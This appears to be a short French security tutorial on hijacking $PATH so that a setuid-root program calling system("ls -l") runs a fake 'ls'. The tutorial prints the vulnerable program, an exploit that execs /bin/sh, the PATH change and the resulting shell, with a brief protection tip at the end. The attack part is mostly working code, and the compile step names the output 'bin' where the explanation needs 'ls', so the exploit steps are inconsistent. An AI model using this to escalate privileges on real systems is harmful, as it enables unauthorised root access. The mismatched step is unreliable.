# System()

## I. La faille
La fonction system() de Linux permet d'éxécuter une commande passée en argument. Pour savoir où se trouve le fichier à lancer lorsque le chemin absolue n'est pas précisé, system() utilise la variable d'environnement $PATH. Il est donc possible d'agir sur cette variable pour tromper system().

## II. Pré-requis
* Un programme suid
* L'argument de system() est un chemin relatif

    aas@ubuntu:~$ cat vuln.c
    void main()
    {
      system("ls -l");
    }

Le comportement normal de ce programme est le suivant. Notons le suid activé.

    ```c
    aas@ubuntu:~$ ./vuln 
    total 48
    drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Desktop
    drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Documents
    drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Downloads
    drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Music
    drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Pictures
    drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Public
    drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Templates
    drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Videos
    -rws--x--x 1 root root 8600 sept. 16 10:07 vuln
    -rw-rw-r-- 1 aas  aas    34 sept. 16 10:07 vuln.c 
    ```

## III. Exploitation de la faille
### Création d'un faux programme 'ls'
    aas@ubuntu:~$ cat exploit.c 
    void main()
    {
      char *shell[] = {"/bin/sh",NULL};
      execve(shell[0],shell,NULL);
    }
    aas@ubuntu:~$ gcc exploit.c -o bin

### Modification de $PATH
    `aas@ubuntu:~$ PATH=.:$PATH`

### Execution
    ```bash
    aas@ubuntu:~$ ./vuln 
    $
    ```

## IV. Protection
On utilise les fonctions de type exec à la place de System. Mettre le chemin absolue avec system est dangereux malgré tout puisqu'il est possible d'utiliser la faille IFS sur certains "anciens".

